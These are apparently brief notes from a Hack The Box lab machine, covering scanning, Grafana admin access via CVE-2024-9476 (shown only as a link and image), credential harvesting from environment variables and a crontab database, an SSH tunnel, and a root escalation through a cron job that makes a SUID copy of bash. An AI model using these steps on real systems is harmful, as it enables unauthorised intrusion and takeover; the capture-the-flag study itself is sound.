Info : credentials for the following account: admin / 0D5oT70Fq13EvB5r
Nmap scan . 

22/tcp open  ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 62:ff:f6:d4:57:88:05:ad:f4:d3:de:5b:9b:f8:50:f1 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMv/TbRhuPIAz+BOq4x+61TDVtlp0CfnTA2y6mk03/g2CffQmx8EL/uYKHNYNdnkO7MO3DXpUbQGq1k2H6mP6Fg=
|   256 4c:ce:7d:5c:fb:2d:a0:9e:9f:bd:f5:5c:5e:61:50:8a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKpJkWOBF3N5HVlTJhPDWhOeW+p9G7f2E9JnYIhKs6R0
80/tcp open  http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://planning.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


Vhost scan :

![[Pasted image 20250913125830.png]]

![[Pasted image 20250913125932.png]]

Got admin access .

Discovered Version : 11.0.0

[

### CVE-2024-9476

](https://grafana.com/blog/2024/11/12/grafana-security-release-medium-severity-security-fix-for-cve-2024-9476/)

![[Pasted image 20250913130107.png]]


Got a shell .


Ran Linpeas 

GF_SECURITY_ADMIN_USER=enzo
GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!


enzo@planning:/opt/crontabs$ cat crontab.db 
{"name":"Grafana backup","command":"/usr/bin/docker save root_grafana -o /var/backups/grafana.tar && /usr/bin/gzip /var/backups/grafana.tar && zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz && rm /var/backups/grafana.tar.gz","schedule":"@daily","stopped":false,"timestamp":"Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)","logging":"false","mailing":{},"created":1740774983276,"saved":false,"_id":"GTI22PpoJNtRKg0W"}


numerated local services by running:

netstat -tupln

◄ 0s ○ ssh -L 9100:127.0.0.1:8000 enzo@10.10.11.68

Created an SSH tunnel to my machine 


Created a new JOB :
cp /bin/bash /tmp/bash && chmod u+s /tmp/bash

Did /tmp/bash -p to get Root !! .